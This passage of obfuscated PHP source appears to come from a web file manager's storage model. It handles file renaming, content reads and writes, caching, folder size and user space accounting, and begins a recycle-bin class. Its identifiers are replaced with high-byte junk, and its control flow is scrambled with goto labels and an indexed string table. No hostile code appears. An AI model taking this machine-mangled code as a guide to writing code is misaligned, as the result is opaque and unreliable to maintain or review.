$D¾’ò‰÷¤·) { goto dÚÛÎÅ¯Ş; f¾ÄğÃíä: $c…Ò½¥Â¬ = $Dğœê­ÜÛ[2350] . $FÇ³‚¡“¬Ä[$Dğœê­ÜÛ[474]]; if (isset(self::$cacheChildList[$c…Ò½¥Â¬])) { unset(self::$cacheChildList[$c…Ò½¥Â¬]); } return $FË›ĞÆ„˜Ğ; goto cƒå–Çìèì; EÔ¼ºˆ«š: $this->setNamePinyin($Dä‡µ Ù, $B¶ÏòÜ†›é[$Dğœê­ÜÛ[38]], !1); $this->updateModifyTime($FÇ³‚¡“¬Ä[$Dğœê­ÜÛ[474]]); $FË›ĞÆ„˜Ğ = $this->where(array($Dğœê­ÜÛ[394] => $Dä‡µ Ù))->data($B¶ÏòÜ†›é)->save(); goto f¾ÄğÃíä; AË…ñé¼Ô: $b÷Ù’á“†ã = $this->fileNameExist($FÇ³‚¡“¬Ä[$Dğœê­ÜÛ[474]], $D¾’ò‰÷¤·); if ($b÷Ù’á“†ã) { return !1; } $B¶ÏòÜ†›é = array($Dğœê­ÜÛ[397] => $D¾’ò‰÷¤·, $Dğœê­ÜÛ[537] => USER_ID); goto e©œÍ‰‰ÌÅ; e©œÍ‰‰ÌÅ: if (!$FÇ³‚¡“¬Ä[$Dğœê­ÜÛ[381]] == $Dğœê­ÜÛ[95]) { $B¶ÏòÜ†›é[$Dğœê­ÜÛ[383]] = get_path_ext($D¾’ò‰÷¤·); } Model($Dğœê­ÜÛ[518])->eventRename($Dä‡µ Ù, $FÇ³‚¡“¬Ä[$Dğœê­ÜÛ[38]], $D¾’ò‰÷¤·); $this->sourceCacheClear($Dä‡µ Ù); goto EÔ¼ºˆ«š; dÚÛÎÅ¯Ş: $Dğœê­ÜÛ =& $_SERVER[¹÷ˆ§éÒ°ú]; $FÇ³‚¡“¬Ä = $this->sourceInfo($Dä‡µ Ù); if (!$FÇ³‚¡“¬Ä) { return !1; } goto AË…ñé¼Ô; cƒå–Çìèì: } public function setNamePinyin($eë ª«ø±, $dîàÙĞÎö, $döŠ×‘ÛÛÚ = true) { $DóğÒŸóÚæ =& $_SERVER[¹÷ˆ§éÒ°ú]; $AÖÌéä¢¦ = Input::check($dîàÙĞÎö, $DóğÒŸóÚæ[541]); if ($döŠ×‘ÛÛÚ && !$AÖÌéä¢¦) { return; } if (!$AÖÌéä¢¦) { $this->metaSet($eë ª«ø±, $DóğÒŸóÚæ[427], null); $this->metaSet($eë ª«ø±, $DóğÒŸóÚæ[426], null); return; } $F¾åÂÍõÑ¦ = array($DóğÒŸóÚæ[427] => str_replace($DóğÒŸóÚæ[60], $DóğÒŸóÚæ[43], Pinyin::encode($dîàÙĞÎö)), $DóğÒŸóÚæ[426] => Pinyin::encode($dîàÙĞÎö, $DóğÒŸóÚæ[542])); $this->metaSet($eë ª«ø±, $F¾åÂÍõÑ¦); } public function getContent($b½˜†ôøÀ¯) { goto BÇÁ”˜Òß¿; BÇÁ”˜Òß¿: $c®Ì×£¿’ =& $_SERVER[¹÷ˆ§éÒ°ú]; $b¤˜Ô²£•¾ = $this->fileInfoGet($b½˜†ôøÀ¯); if (!$b¤˜Ô²£•¾) { return !1; } goto F‘Œñ¯ÄĞ³; F‘Œñ¯ÄĞ³: if ($b¤˜Ô²£•¾[$c®Ì×£¿’[89]] == 0) { return $c®Ì×£¿’[43]; } $FóÒãØ©Úå = $c®Ì×£¿’[2365] . $b¤˜Ô²£•¾[$c®Ì×£¿’[175]]; if ($b¤˜Ô²£•¾[$c®Ì×£¿’[89]] <= 1024 * 10) { $aÕåˆæò = Cache::get($FóÒãØ©Úå); if (!$aÕåˆæò) { $aÕåˆæò = IO::getContent($b¤˜Ô²£•¾[$c®Ì×£¿’[87]]); Cache::set($FóÒãØ©Úå, $aÕåˆæò); } return $aÕåˆæò; } goto CÍõŠóàÁ‚; CÍõŠóàÁ‚: return IO::getContent($b¤˜Ô²£•¾[$c®Ì×£¿’[87]]); goto bïÅ·±‰Ü†; bïÅ·±‰Ü†: } public function setDesc($EÔœÉ¸¿±, $d¯µè‘ÙÊ…) { $BùÙÒšˆÂí =& $_SERVER[¹÷ˆ§éÒ°ú]; Model($BùÙÒšˆÂí[518])->eventAddDesc($EÔœÉ¸¿±, $d¯µè‘ÙÊ…); return $this->metaSet($EÔœÉ¸¿±, $BùÙÒšˆÂí[416], $d¯µè‘ÙÊ…); } public function setContent($e¨ïÃªâµ, $E¸­³Ç· È = '') { goto B›é³Û‹¾‘; A‹‰ïù±Õ: if (!$cÒ™§É÷) { return Model($B®®¬¿†ôß[433])->remove($B¹¨„ºçª»[$B®®¬¿†ôß[430]]); } $this->folderSizeReset($E°İ«¶¶É[$B®®¬¿†ôß[474]]); return !0; goto Bš¹í—˜ö´; eœÎ—İÎÙ—: if (!$fâ‰ğæŸáã || !$E°İ«¶¶É) { return !1; } $B¹¨„ºçª» = Model($B®®¬¿†ôß[433])->addFileByContent($E¸­³Ç· È, $E°İ«¶¶É[$B®®¬¿†ôß[38]]); $cÒ™§É÷ = $this->fileHistory($E°İ«¶¶É, $B¹¨„ºçª»[$B®®¬¿†ôß[430]], $B¹¨„ºçª»[$B®®¬¿†ôß[89]]); goto A‹‰ïù±Õ; B›é³Û‹¾‘: $B®®¬¿†ôß =& $_SERVER[¹÷ˆ§éÒ°ú]; $E°İ«¶¶É = $this->sourceInfo($e¨ïÃªâµ); $fâ‰ğæŸáã = $this->fileInfoGet($e¨ïÃªâµ); goto eœÎ—İÎÙ—; Bš¹í—˜ö´: } public function fileSubstr($b»ÍÅ÷´Ãİ, $dô÷“ƒ, $E™¡Ò†) { $BÚ¶ÆÙÒÆÁ = $this->fileInfoGet($b»ÍÅ÷´Ãİ); if (!$BÚ¶ÆÙÒÆÁ) { return !1; } return IO::fileSubstr($BÚ¶ÆÙÒÆÁ[$_SERVER[¹÷ˆ§éÒ°ú][87]], $dô÷“ƒ, $E™¡Ò†); } public function fileInfoGet($CåËŸğ“íÃ) { goto Aå„³¹ø£; Aå„³¹ø£: $B‘Ñ¶í˜  =& $_SERVER[¹÷ˆ§éÒ°ú]; $dìçŞÀÇÈº = $this->sourceInfo($CåËŸğ“íÃ); if (!$dìçŞÀÇÈº || $dìçŞÀÇÈº[$B‘Ñ¶í˜ [381]]) { return !1; } goto C¹öƒˆãÇ; c«º¸á‚¶š: $FÇ«¿¬´ßÁ = Model($B‘Ñ¶í˜ [433])->fileInfo($dìçŞÀÇÈº[$B‘Ñ¶í˜ [430]]); if ($FÇ«¿¬´ßÁ) { $FÇ«¿¬´ßÁ[$B‘Ñ¶í˜ [38]] = $dìçŞÀÇÈº[$B‘Ñ¶í˜ [38]]; } self::$cacheFileInfo[$eÌ²ïò] = $FÇ«¿¬´ßÁ; goto fä•ÈŞÏ–½; C¹öƒˆãÇ: $eÌ²ïò = $B‘Ñ¶í˜ [436] . $dìçŞÀÇÈº[$B‘Ñ¶í˜ [430]]; $C­È£®Œîİ = _get(self::$cacheFileInfo, $eÌ²ïò); if ($C­È£®Œîİ) { return $C­È£®Œîİ; } goto c«º¸á‚¶š; fä•ÈŞÏ–½: return $FÇ«¿¬´ßÁ; goto Dë’óÂƒ‡ì; Dë’óÂƒ‡ì: } private function folderChildrenNumber($Aİç‹èÒ—) { $b±Êñ¨ùĞ£ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Bô±ôÌøÓ™ = $this->sourceInfo($Aİç‹èÒ—); $FËñš”µÙ« = array($b±Êñ¨ùĞ£[538] => array($b±Êñ¨ùĞ£[496], $Bô±ôÌøÓ™[$b±Êñ¨ùĞ£[472]] . $Aİç‹èÒ— . $b±Êñ¨ùĞ£[497]), $b±Êñ¨ùĞ£[407] => intval($Bô±ôÌøÓ™[$b±Êñ¨ùĞ£[408]]), $b±Êñ¨ùĞ£[531] => 1); $C¯çÃéÌ˜ = $this->where($FËñš”µÙ«)->count(); $DƒŞÉÌ£æë = $this->where($FËñš”µÙ«)->where(array($b±Êñ¨ùĞ£[531] => 0))->count(); return array($b±Êñ¨ùĞ£[93] => $DƒŞÉÌ£æë, $b±Êñ¨ùĞ£[94] => $C¯çÃéÌ˜); } public function pathInfo($bµéö¾ò¤Î, $bíùˆ±ÖÙ = false) { goto b¶±Áø‹Ñ; BÌÅ¸ÔŸËô: if ($EÃ–’ºé²ö) { return $EÃ–’ºé²ö; } $BÊ´¢£¢öƒ = $this->sourceInfo($bµéö¾ò¤Î); if (!$BÊ´¢£¢öƒ) { return !1; } goto b×ƒîè÷Ô´; b×ƒîè÷Ô´: $BÊ´¢£¢öƒ = $this->_listDataApplyItem($BÊ´¢£¢öƒ, $bíùˆ±ÖÙ); self::$cachePathInfo[$FŠëìŒíÅã] = $BÊ´¢£¢öƒ; return $BÊ´¢£¢öƒ; goto AïÉèçš; b¶±Áø‹Ñ: $bò ‡ôÃ =& $_SERVER[¹÷ˆ§éÒ°ú]; $FŠëìŒíÅã = $bò ‡ôÃ[422] . intval($bíùˆ±ÖÙ) . $bò ‡ôÃ[423] . $bµéö¾ò¤Î; $EÃ–’ºé²ö = _get(self::$cachePathInfo, $FŠëìŒíÅã); goto BÌÅ¸ÔŸËô; AïÉèçš: } public static $cachePathInfoMore = array(); public function pathInfoMore($e¾Éñãùì) { goto e§ã¹ÜÙæ¾; FøÅÚ¸¨Ø¹: self::$cachePathInfoMore[$e¾Éñãùì] = $AÑøî±›…; return $AÑøî±›…; goto EĞƒ¯‹³ĞŒ; FôšÌ±­ô…: $AÑøî±›… = $this->pathInfo($e¾Éñãùì); if (!$AÑøî±›…) { return !1; } if ($AÑøî±›…[$FÕ¶µŞŸæÚ[381]] == $FÕ¶µŞŸæÚ[95]) { $AÑøî±›…[$FÕ¶µŞŸæÚ[92]] = $this->folderChildrenNumber($e¾Éñãùì); } goto FøÅÚ¸¨Ø¹; e§ã¹ÜÙæ¾: $FÕ¶µŞŸæÚ =& $_SERVER[¹÷ˆ§éÒ°ú]; $FÚññÂùãî = _get(self::$cachePathInfoMore, $e¾Éñãùì); if ($FÚññÂùãî) { return $FÚññÂùãî; } goto FôšÌ±­ô…; EĞƒ¯‹³ĞŒ: } public function sourceInfo($DÍ¡íšˆÚˆ) { goto aóĞ­ˆØìö; aóĞ­ˆØìö: $AºÕù†ÅĞì =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$DÍ¡íšˆÚˆ) { return array(); } $b¢’ƒÅÌ¬¾ = $AºÕù†ÅĞì[421] . $DÍ¡íšˆÚˆ; goto b¼ĞòµÈ¸à; fó½‘æèé’: self::$cacheSourceInfo[$b¢’ƒÅÌ¬¾] = $c¢»Š‹‡Ô; return self::$cacheSourceInfo[$b¢’ƒÅÌ¬¾]; goto a‹äæÂÁ; b¼ĞòµÈ¸à: $aœ·´ñ›è‘ = _get(self::$cacheSourceInfo, $b¢’ƒÅÌ¬¾); if ($aœ·´ñ›è‘) { return $aœ·´ñ›è‘; } $c¢»Š‹‡Ô = $this->where(array($AºÕù†ÅĞì[380] => $DÍ¡íšˆÚˆ))->find(); goto fó½‘æèé’; a‹äæÂÁ: } public function sourceCacheClear($DÄà´‰±”° = false) { if ($DÄà´‰±”° == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[¹÷ˆ§éÒ°ú][421] . $DÄà´‰±”°]); } public function pathInfoByPath($aí‹¼’ƒÉï, $f„Êğ¼×) { $Dí­É©Ù® =& $_SERVER[¹÷ˆ§éÒ°ú]; $CÉ“µ¹â–Ë = !$f„Êğ¼× ? array() : explode($Dí­É©Ù®[18], trim($f„Êğ¼×, $Dí­É©Ù®[18])); $Bé Ô¦ô¸ = $aí‹¼’ƒÉï; foreach ($CÉ“µ¹â–Ë as $bíØ©Íç†å) { $Fƒ®ïğÔÚ‚ = array($Dí­É©Ù®[474] => $Bé Ô¦ô¸, $Dí­É©Ù®[38] => $bíØ©Íç†å); $eù†À‘Å† = $this->where($Fƒ®ïğÔÚ‚)->select(); if (!$eù†À‘Å†) { return !1; } $eù†À‘Å† = array_sort_by($eù†À‘Å†, $Dí­É©Ù®[408]); $Bé Ô¦ô¸ = $eù†À‘Å†[0][$Dí­É©Ù®[380]]; } return $this->pathInfo($Bé Ô¦ô¸, !0); } protected function updateModifyTime($BÜíŸ°»¡¹) { goto bµğ¬Ë×£Š; d†Ü¿¤‚Àµ: $this->where($cøÂ¥œƒéÂ)->save($aî¥‚À‡ÊÁ); goto B¢Íˆ…óÆŞ; f¸“ÎÚˆ’: foreach ($BÜíŸ°»¡¹ as $eÖƒ…İÉŸç => $A¥‹Æî®íâ) { $BÜíŸ°»¡¹[$eÖƒ…İÉŸç] = intval($A¥‹Æî®íâ); } $cøÂ¥œƒéÂ = array($dËš–ÏÁïÜ[380] => array($dËš–ÏÁïÜ[17], $BÜíŸ°»¡¹)); $aî¥‚À‡ÊÁ = array($dËš–ÏÁïÜ[537] => USER_ID, $dËš–ÏÁïÜ[401] => time()); goto d†Ü¿¤‚Àµ; bµğ¬Ë×£Š: $dËš–ÏÁïÜ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$BÜíŸ°»¡¹) { return; } if (!is_array($BÜíŸ°»¡¹)) { $BÜíŸ°»¡¹ = array($BÜíŸ°»¡¹); } goto f¸“ÎÚˆ’; B¢Íˆ…óÆŞ: } public function folderSizeReset($C¥òˆå¾Ü) { goto B¡˜ÌËÉ Ç; B¡˜ÌËÉ Ç: $FØàÕÆ˜ŞÉ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($this->statusIgnoreResetSpace) { return; } $BƒàšáøÉ‹ = $FØàÕÆ˜ŞÉ[2366] . $C¥òˆå¾Ü; goto AôÑ÷ª†‰ˆ; DĞâ—ôà¦±: $eåˆ‰„à = array($FØàÕÆ˜ŞÉ[379] => $C¥òˆå¾Ü, $FØàÕÆ˜ŞÉ[407] => 0); $DÀÌÂô¬¯ = $this->where($eåˆ‰„à)->sum($FØàÕÆ˜ŞÉ[89]); $DÀÌÂô¬¯ = intval($DÀÌÂô¬¯); goto C˜Åˆöó¢; C˜Åˆöó¢: $b¿ñàÀßï² = $DÀÌÂô¬¯ - intval($BˆÌÔÓ¢™[$FØàÕÆ˜ŞÉ[89]]); if ($b¿ñàÀßï² == 0) { return CacheLock::unlock($BƒàšáøÉ‹); } $this->where(array($FØàÕÆ˜ŞÉ[394] => $C¥òˆå¾Ü))->setField($FØàÕÆ˜ŞÉ[89], $DÀÌÂô¬¯); goto aêµğ®²ô; e¨´ò¨¦óâ: CacheLock::unlock($BƒàšáøÉ‹); goto DÆŞó‹ÃÊŠ; aêµğ®²ô: $Fà¾Ù«÷´‰ = $this->parentLevelArray($BˆÌÔÓ¢™[$FØàÕÆ˜ŞÉ[472]]); if ($Fà¾Ù«÷´‰) { $eåˆ‰„à = array($FØàÕÆ˜ŞÉ[380] => array($FØàÕÆ˜ŞÉ[395], $Fà¾Ù«÷´‰)); if ($b¿ñàÀßï² < 0) { $eåˆ‰„à[$FØàÕÆ˜ŞÉ[89]] = array($FØàÕÆ˜ŞÉ[919], abs($b¿ñàÀßï²)); } $this->where($eåˆ‰„à)->setAdd($FØàÕÆ˜ŞÉ[89], $b¿ñàÀßï²); } $this->targetSpaceUpdate($BˆÌÔÓ¢™[$FØàÕÆ˜ŞÉ[382]], $BˆÌÔÓ¢™[$FØàÕÆ˜ŞÉ[469]]); goto e¨´ò¨¦óâ; AôÑ÷ª†‰ˆ: CacheLock::lock($BƒàšáøÉ‹, 20); $this->sourceCacheClear($C¥òˆå¾Ü); $BˆÌÔÓ¢™ = $this->sourceInfo($C¥òˆå¾Ü); goto DĞâ—ôà¦±; DÆŞó‹ÃÊŠ: } public function folderSizeResetChildren($DÏêù½¸á³) { goto c±§ÊåƒËÚ; C‚»Ñ„á”‚: $BÍŸ«ËÉ©‚ = array($Bäø±Ô§„Ò[531] => 1, $Bäø±Ô§„Ò[538] => array($Bäø±Ô§„Ò[496], $fÏŒ›æõÄ–[$Bäø±Ô§„Ò[472]] . $DÏêù½¸á³ . $Bäø±Ô§„Ò[497])); $AïÅ×¬†íÀ = $Bäø±Ô§„Ò[2367]; $AÖñ‰¨¬ã = $this->field($AïÅ×¬†íÀ)->where($BÍŸ«ËÉ©‚)->select(); goto EÈ’¦Œä…; C‚ßÉÜ†: foreach ($AÖñ‰¨¬ã as $bÇä¥èˆ) { if ($bÇä¥èˆ[$Bäø±Ô§„Ò[89]] == $bÇä¥èˆ[$Bäø±Ô§„Ò[2368]]) { continue; } $aÁ˜ô¹¨ÈÍ[] = array($Bäø±Ô§„Ò[380], $bÇä¥èˆ[$Bäø±Ô§„Ò[380]], $Bäø±Ô§„Ò[89], $bÇä¥èˆ[$Bäø±Ô§„Ò[89]]); } $this->saveAll($aÁ˜ô¹¨ÈÍ); goto b„æ¢¸‹¹; fñ·á ¹è: foreach ($FÊÅÉÙç´œ as $bÇä¥èˆ) { $b½Å¬†í… = $bÇä¥èˆ[$Bäø±Ô§„Ò[474]] . $Bäø±Ô§„Ò[43]; if (!isset($AÖñ‰¨¬ã[$b½Å¬†í…])) { continue; } if ($bÇä¥èˆ[$Bäø±Ô§„Ò[408]] == $AÖñ‰¨¬ã[$b½Å¬†í…][$Bäø±Ô§„Ò[408]]) { $AÖñ‰¨¬ã[$b½Å¬†í…][$Bäø±Ô§„Ò[89]] += $bÇä¥èˆ[$Bäø±Ô§„Ò[89]]; } } foreach ($AÖñ‰¨¬ã as $bÇä¥èˆ) { $AƒŸ‰«µ™ = $this->parentLevelArray($bÇä¥èˆ[$Bäø±Ô§„Ò[472]]); foreach ($AƒŸ‰«µ™ as $b½Å¬†í…) { $b½Å¬†í… = $b½Å¬†í… . $Bäø±Ô§„Ò[43]; if (!isset($AÖñ‰¨¬ã[$b½Å¬†í…])) { continue; } if ($bÇä¥èˆ[$Bäø±Ô§„Ò[408]] == $AÖñ‰¨¬ã[$b½Å¬†í…][$Bäø±Ô§„Ò[408]]) { $AÖñ‰¨¬ã[$b½Å¬†í…][$Bäø±Ô§„Ò[89]] += $bÇä¥èˆ[$Bäø±Ô§„Ò[89]]; } } } $aÁ˜ô¹¨ÈÍ = array(); goto C‚ßÉÜ†; CˆÀª×ôÒÙ: $AÖñ‰¨¬ã[] = $fÏŒ›æõÄ–; $AÖñ‰¨¬ã = array_to_keyvalue($AÖñ‰¨¬ã, $Bäø±Ô§„Ò[380]); foreach ($AÖñ‰¨¬ã as $dÕêßŠÉ…ô => $bÇä¥èˆ) { $AÖñ‰¨¬ã[$dÕêßŠÉ…ô][$Bäø±Ô§„Ò[2368]] = $AÖñ‰¨¬ã[$dÕêßŠÉ…ô][$Bäø±Ô§„Ò[89]]; $AÖñ‰¨¬ã[$dÕêßŠÉ…ô][$Bäø±Ô§„Ò[89]] = 0; } goto fñ·á ¹è; c±§ÊåƒËÚ: $Bäø±Ô§„Ò =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->sourceCacheClear($DÏêù½¸á³); $fÏŒ›æõÄ– = $this->sourceInfo($DÏêù½¸á³); goto C‚»Ñ„á”‚; EÈ’¦Œä…: $BÍŸ«ËÉ©‚[$Bäø±Ô§„Ò[381]] = 0; $FÊÅÉÙç´œ = $this->field($AïÅ×¬†íÀ)->where($BÍŸ«ËÉ©‚)->select(); if (!$FÊÅÉÙç´œ) { return; } goto CˆÀª×ôÒÙ; b„æ¢¸‹¹: } public function userSpaceReset($d­…“Ø¾Š” = false) { $fï™°ö”¯  =& $_SERVER[¹÷ˆ§éÒ°ú]; $A¯Àµßîè = $this->where(array($fï™°ö”¯ [382] => self::TYPE_USER, $fï™°ö”¯ [469] => $d­…“Ø¾Š”, $fï™°ö”¯ [381] => 0))->sum($fï™°ö”¯ [89]); Model($fï™°ö”¯ [487])->userEdit($d­…“Ø¾Š”, array($fï™°ö”¯ [2084] => $A¯Àµßîè)); } public function targetSpaceUpdate($f‹ğ¢©­«æ, $aìÃÉ©ƒˆÔ) { $fÉÅ‚‡©ëÈ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$aìÃÉ©ƒˆÔ) { return; } if (!in_array($f‹ğ¢©­«æ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Eôô†µ¡®œ = $this->targetSpaceSize($f‹ğ¢©­«æ, $aìÃÉ©ƒˆÔ); if ($f‹ğ¢©­«æ == self::TYPE_USER) { Model($fÉÅ‚‡©ëÈ[487])->userEdit($aìÃÉ©ƒˆÔ, array($fÉÅ‚‡©ëÈ[2084] => $Eôô†µ¡®œ)); } else { if ($f‹ğ¢©­«æ == self::TYPE_GROUP) { Model($fÉÅ‚‡©ëÈ[471])->groupEdit($aìÃÉ©ƒˆÔ, array($fÉÅ‚‡©ëÈ[2084] => $Eôô†µ¡®œ)); } } } public function targetSpaceSize($f›«½îÔµ, $FÁ¿à¥í©¥) { goto d»àĞŞ«„; aÉÑœÉÜ”“: return $b»·«¡œ•Ü; goto cÖ††¶×å; bÏÄ²ÌÀ“: $D¾ìÙïì½ñ = array_to_keyvalue($D¾ìÙïì½ñ, $f¬ÒŒêê˜Ş[43], $f¬ÒŒêê˜Ş[380]); $D¾ìÙïì½ñ = array_unique(array_filter($D¾ìÙïì½ñ)); if ($D¾ìÙïì½ñ) { $d”’šæë•é = array($f¬ÒŒêê˜Ş[394] => array($f¬ÒŒêê˜Ş[395], $D¾ìÙïì½ñ)); $b»·«¡œ•Ü += floatval($this->where($d”’šæë•é)->sum($f¬ÒŒêê˜Ş[89])); } goto aÉÑœÉÜ”“; d»àĞŞ«„: $f¬ÒŒêê˜Ş =& $_SERVER[¹÷ˆ§éÒ°ú]; $FÑñ¬ñØô¼ = $this->sourceRoot($f›«½îÔµ, $FÁ¿à¥í©¥, !0); if (!$FÑñ¬ñØô¼) { return 0; } goto CÕĞ¾™‘Í½; CÕĞ¾™‘Í½: $b»·«¡œ•Ü = floatval($FÑñ¬ñØô¼[$f¬ÒŒêê˜Ş[89]]); $d”’šæë•é = array($f¬ÒŒêê˜Ş[538] => array($f¬ÒŒêê˜Ş[496], $f¬ÒŒêê˜Ş[483] . $FÑñ¬ñØô¼[$f¬ÒŒêê˜Ş[380]] . $f¬ÒŒêê˜Ş[497])); $D¾ìÙïì½ñ = Model($f¬ÒŒêê˜Ş[406])->field($f¬ÒŒêê˜Ş[394])->where($d”’šæë•é)->select(); goto bÏÄ²ÌÀ“; cÖ††¶×å: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Cè´Øñ·÷ø) { return $this->fileTypeProfile($Cè´Øñ·÷ø, SourceModel::TYPE_USER); } public function groupFileTypeProfile($eÛ©í–ø§) { return $this->fileTypeProfile($eÛ©í–ø§, SourceModel::TYPE_GROUP); } private function fileTypeProfile($aÉÜ ›ÛÆõ, $f–…ñÁ‰ÌŸ) { goto CƒÊ½ôàµ; e´ÁÒµ£ÛÄ: foreach ($E°çÌ£” as $cóÜ´…•ˆ => $b“‡Æ‡ŸŠÊ) { $E‰ë…Œ‡‹[$eãƒÜ©„°¾[383]] = $this->fileTypeWhere($cóÜ´…•ˆ); $fšÈÓ¶…©«[$cóÜ´…•ˆ] = array($eãƒÜ©„°¾[2371] => $b“‡Æ‡ŸŠÊ[$eãƒÜ©„°¾[38]], $eãƒÜ©„°¾[2372] => $this->where($E‰ë…Œ‡‹)->count(), $eãƒÜ©„°¾[533] => $this->where($E‰ë…Œ‡‹)->sum($eãƒÜ©„°¾[89])); } Cache::set($A–ô²Õ·Ã¯, $fšÈÓ¶…©«, 1200); return $fšÈÓ¶…©«; goto bğæ¼Óº…¾; CƒÊ½ôàµ: $eãƒÜ©„°¾ =& $_SERVER[¹÷ˆ§éÒ°ú]; $A–ô²Õ·Ã¯ = $eãƒÜ©„°¾[2369] . $aÉÜ ›ÛÆõ . $eãƒÜ©„°¾[82] . $f–…ñÁ‰ÌŸ; $eŠ¯¶¯¤ = Cache::get($A–ô²Õ·Ã¯); goto a¡Ëí¼……Ş; aÎ—Ÿ§ä¨ì: $fšÈÓ¶…©« = array(); $fšÈÓ¶…©«[$eãƒÜ©„°¾[2370]] = array($eãƒÜ©„°¾[2371] => LNG($eãƒÜ©„°¾[2370]), $eãƒÜ©„°¾[2372] => $this->where($E‰ë…Œ‡‹)->count(), $eãƒÜ©„°¾[533] => $this->where($E‰ë…Œ‡‹)->sum($eãƒÜ©„°¾[89])); $E°çÌ£” = KodIO::fileTypeList(); goto e´ÁÒµ£ÛÄ; a¡Ëí¼……Ş: if ($eŠ¯¶¯¤) { return $eŠ¯¶¯¤; } $E‰ë…Œ‡‹ = array($eãƒÜ©„°¾[531] => 0); if ($aÉÜ ›ÛÆõ != !1) { $E‰ë…Œ‡‹[$eãƒÜ©„°¾[469]] = $aÉÜ ›ÛÆõ; $E‰ë…Œ‡‹[$eãƒÜ©„°¾[382]] = $f–…ñÁ‰ÌŸ; } goto aÎ—Ÿ§ä¨ì; bğæ¼Óº…¾: } public function fileNameExist($c ‰§¸Ê³¾, $CÎ¡ø»·°…) { $c®ñ÷áˆ¨Í =& $_SERVER[¹÷ˆ§éÒ°ú]; $c˜Âôñï”Œ = $this->childList($c ‰§¸Ê³¾); foreach ($c˜Âôñï”Œ as $c¹Ûëö„ë) { if ($c¹Ûëö„ë[$c®ñ÷áˆ¨Í[38]] == $CÎ¡ø»·°…) { return $c¹Ûëö„ë[$c®ñ÷áˆ¨Í[380]]; } } return !1; } public function childList($eÛæÉŒ£Ó) { goto F ›õ©´™; F‡Êøó®·ç: self::$cacheChildList[$EïíÈº­·‹] = $cåÀ…«‘ÖÖ; foreach ($cåÀ…«‘ÖÖ as $CèÉç«„ø) { $EïíÈº­·‹ = $DË’ÈÊÏòÓ[421] . $CèÉç«„ø[$DË’ÈÊÏòÓ[380]]; self::$cacheSourceInfo[$EïíÈº­·‹] = $CèÉç«„ø; } return $cåÀ…«‘ÖÖ; goto E”÷×ŒêÑ; cƒ“Ù²«½: $CÔËİ ¯†“ = array($DË’ÈÊÏòÓ[474] => intval($eÛæÉŒ£Ó), $DË’ÈÊÏòÓ[408] => 0); $cåÀ…«‘ÖÖ = $this->where($CÔËİ ¯†“)->select(); $cåÀ…«‘ÖÖ = $cåÀ…«‘ÖÖ ? $cåÀ…«‘ÖÖ : array(); goto F‡Êøó®·ç; F ›õ©´™: $DË’ÈÊÏòÓ =& $_SERVER[¹÷ˆ§éÒ°ú]; $EïíÈº­·‹ = $DË’ÈÊÏòÓ[2350] . $eÛæÉŒ£Ó; if (isset(self::$cacheChildList[$EïíÈº­·‹])) { return self::$cacheChildList[$EïíÈº­·‹]; } goto cƒ“Ù²«½; E”÷×ŒêÑ: } public function fileNameAuto($eòø’¼ÇÀ», $c—Ïˆİ¼§Ö, $aá–ˆ­¼¥  = REPEAT_RENAME, $bŞ†• Ş„Ò = false) { $a­Ğé‚ã‹š =& $_SERVER[¹÷ˆ§éÒ°ú]; $a¯Ÿ¦¸í” = $this->childList($eòø’¼ÇÀ»); $eøõ¦ŞòÚ = array_to_keyvalue($a¯Ÿ¦¸í”, $a­Ğé‚ã‹š[43], $a­Ğé‚ã‹š[38]); return $this->fileNameAutoGet($eøõ¦ŞòÚ, $c—Ïˆİ¼§Ö, $aá–ˆ­¼¥ , $bŞ†• Ş„Ò); } public function fileNameAutoGet($F”˜­ç×, $DŠÕÄÊ‹¡©, $EˆÆ©Ö©Ã³, $aŸ’ÔÄä°‡) { $dæĞ‰ĞÅ³ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($EˆÆ©Ö©Ã³ == REPEAT_REPLACE || !$F”˜­ç× || !in_array_not_case($DŠÕÄÊ‹¡©, $F”˜­ç×) || $aŸ’ÔÄä°‡ && $EˆÆ©Ö©Ã³ != REPEAT_RENAME_FOLDER) { return $DŠÕÄÊ‹¡©; } if ($EˆÆ©Ö©Ã³ == REPEAT_SKIP) { return !1; } $fß—”˜™ = $dæĞ‰ĞÅ³[103] . get_path_ext($DŠÕÄÊ‹¡©); $fß—”˜™ = $fß—”˜™ == $dæĞ‰ĞÅ³[103] || $aŸ’ÔÄä°‡ ? $dæĞ‰ĞÅ³[43] : $fß—”˜™; for ($FµÈŞ¡ùí = 1; $FµÈŞ¡ùí <= count($F”˜­ç×) + 1; $FµÈŞ¡ùí++) { $B™öø¡£ = substr($DŠÕÄÊ‹¡©, 0, strlen($DŠÕÄÊ‹¡©) - strlen($fß—”˜™)); $EèÜˆƒ‘åğ = $B™öø¡£ . "\50{$FµÈŞ¡ùí}\x29{$fß—”˜™}"; if (!in_array_not_case($EèÜˆƒ‘åğ, $F”˜­ç×)) { return $EèÜˆƒ‘åğ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\162\143\x65\x5f\x72\145\x63\171\143\x6c\145"; protected $dataAuto = array(array("\143\x72\145\x61\x74\x65\124\x69\x6d\145", "\164\x69\155\x65", "\151\x6e\163\x65\162\164", "\x66\x75\x6e\x63\164\x69\x6f\x6e")); public function listData($aÚ’ÏÇÂ¼¹ = false) { $c®îä¤Ú¯ =& $_SERVER[¹÷ˆ§éÒ°ú]; $aÚ’ÏÇÂ¼¹ = $aÚ’ÏÇÂ¼¹ ? $aÚ’ÏÇÂ¼¹ : USER_ID; $dÔƒÅØ¯‹Æ = $this->where(array($c®îä¤Ú¯[1418] => $aÚ’ÏÇÂ¼¹))->select(); return array_to_keyvalue($dÔƒÅØ¯‹Æ, $c®îä¤Ú¯[43], $c®îä¤Ú¯[380]); } public function moveToRecycle($eî¦«¼ôòø) { goto E„Ê¤‰àŠ ; bãç¢ˆ©¨Á: if (!$E§†ëµµ || $E§†ëµµ[$e¸¶ë¨ßÍ“[408]] == $e¸¶ë¨ßÍ“[95]) { 